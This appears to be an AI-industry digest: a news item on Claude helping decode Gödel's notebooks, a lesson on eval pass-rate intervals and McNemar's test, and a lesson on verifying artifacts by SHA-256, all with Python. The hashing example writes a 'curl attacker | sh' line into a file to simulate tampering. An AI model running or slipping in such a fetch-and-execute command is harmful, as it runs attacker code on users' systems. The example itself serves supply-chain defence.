### 1 · Claude helps decode Gödel's shorthand notebooks, finding 663 theorems with proofs or sketches

`I = 68.0` · Research · Europe · Anthropic, University of Helsinki, Institute for Advanced Study

Since 2017, Jan von Plato's University of Helsinki project has been transcribing 16 notebooks Kurt Gödel wrote in the early 1940s, mostly in the obsolete Gabelsberger shorthand. **Why it matters.** This is a concrete case of a frontier model speeding up archival and mathematical scholarship by orders of magnitude. It also raises an open attribution question: how much of the result is Gödel's work and how much is the model's repair of gaps.

### L1 · Report an eval pass rate with an interval, and compare setups with a paired test

`LLM / agent evaluation` · now 2.5 → target 4.5 · priority 2.00 · ~15 min

**Why today.** Anthropic's eval guidance urges reporting uncertainty, and coverage highlights one model scoring 60% via the API and 94% on claude.ai on the same self-harm eval. ([Anthropic publishes guidance on building safety evals, showing one model scored 60% or 94% depending on setup](https://www.anthropic.com/research/building-strong-safety-evaluations))

A pass rate from n graded transcripts is a binomial estimate, so publish an interval, not a point. The Wilson score interval behaves well near 0% and 100% and at small n, where the normal approximation p ± 1.96√(p(1−p)/n) can leave [0,1]. To ask whether two setups differ, a two-proportion z-test works for independent samples. When the same prompts are run under both setups, use McNemar's test on the discordant pairs instead, because only prompts whose outcome flips carry information and pairing removes prompt-difficulty variance. The limits: these intervals cover sampling noise only. They say nothing about grader error, prompt-set coverage or whether the construct is the right one, which is why the guidance also asks for grader validation against humans.

$$
\tilde p \pm \frac{z}{1+z^2/n}\sqrt{\frac{\hat p(1-\hat p)}{n}+\frac{z^2}{4n^2}},\quad \tilde p=\frac{\hat p+z^2/(2n)}{1+z^2/n};\qquad \chi^2_{\text{McNemar}}=\frac{(|b-c|-1)^2}{b+c}
$$

```python
# Report a safety-eval pass rate with its uncertainty, and test two setups (illustrative numbers)
import math
def wilson(k, n, z=1.96):
    p = k / n
    den = 1 + z * z / n
    c = (p + z * z / (2 * n)) / den
    h = z * math.sqrt(p * (1 - p) / n + z * z / (4 * n * n)) / den
    return c - h, c + h
def two_prop_z(k1, n1, k2, n2):
    p1, p2 = k1 / n1, k2 / n2
    p = (k1 + k2) / (n1 + n2)
    se = math.sqrt(p * (1 - p) * (1 / n1 + 1 / n2))
    return (p2 - p1) / se
for n in (20, 50, 200):
    k_api, k_app = round(0.60 * n), round(0.94 * n)   # same model, two deployment setups
    lo1, hi1 = wilson(k_api, n); lo2, hi2 = wilson(k_app, n)
    z = two_prop_z(k_api, n, k_app, n)
    print(f"n={n:4d}  API {k_api/n:.0%} [{lo1:.0%},{hi1:.0%}]  app {k_app/n:.0%} [{lo2:.0%},{hi2:.0%}]  z={z:.2f}")
# Same transcripts graded in both setups? Prefer a paired test (McNemar) on the discordant pairs b, c.
b, c = 4, 38            # illustrative: fail->pass 38 times, pass->fail 4 times
print("McNemar chi2 =", round((abs(b - c) - 1) ** 2 / (b + c), 1))
```

### L2 · Pin dev-tool artifacts by SHA-256 and verify before install

`Agent / harness engineering` · now 4.0 → target 5.0 · priority 0.70 · ~10 min

**Why today.** Cursor says a stolen credential let an attacker plant tampered Claude Code extension builds in its marketplace cache for about 11 hours, reaching up to 5,000 users. ([Cursor traces its breach to a key leaked by Fireworks AI; tampered Claude Code extension reached up to 5,000 users](https://cursor.com/blog/security-incident-update))

A version number names a release but does not bind its bytes: whoever controls a registry, mirror or cache can serve different content under the same name. Recording a cryptographic hash when you first review an artifact, and refusing to install anything whose hash differs, turns 'same version' into 'same bytes'. SHA-256 is collision- and second-preimage-resistant, so an attacker cannot practically craft a malicious file with the pinned digest. Lockfiles in pip (--require-hashes), npm and Nix apply the same idea to dependencies, and agent harnesses that auto-install tools should do the same. The limit: a hash only proves the bytes match what you reviewed. If the first copy was already malicious, or the publisher's key is stolen, you need signatures checked against keys obtained out of band, plus review.

$$
\Pr[\mathrm{SHA256}(x')=\mathrm{SHA256}(x)] \approx 2^{-256} \text{ for a chosen } x' \neq x
$$

```python
# Verify a downloaded artifact against a pinned SHA-256 before installing it (illustrative)
import hashlib, hmac, os, tempfile
def sha256_file(path, chunk=1 << 16):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for block in iter(lambda: f.read(chunk), b""):
            h.update(block)
    return h.hexdigest()
def verify(path, pinned_hex):
    return hmac.compare_digest(sha256_file(path), pinned_hex)
tmp = tempfile.mkdtemp()
good = os.path.join(tmp, "ext-2.1.0.vsix")
with open(good, "wb") as f:
    f.write(b"PK\x03\x04 legit extension bytes")
lockfile = {"ext-2.1.0.vsix": sha256_file(good)}   # recorded when you first reviewed it
print("pinned  :", lockfile["ext-2.1.0.vsix"][:16], "...")
print("verify original:", verify(good, lockfile["ext-2.1.0.vsix"]))
with open(good, "ab") as f:                         # a mirror/cache serves a tampered copy
    f.write(b"\n#!/bin/sh curl attacker | sh")
print("verify tampered:", verify(good, lockfile["ext-2.1.0.vsix"]))
# A hash proves the bytes match what you reviewed, not that they are safe; pair it with a
# publisher signature checked against a key you obtained out of band.
```
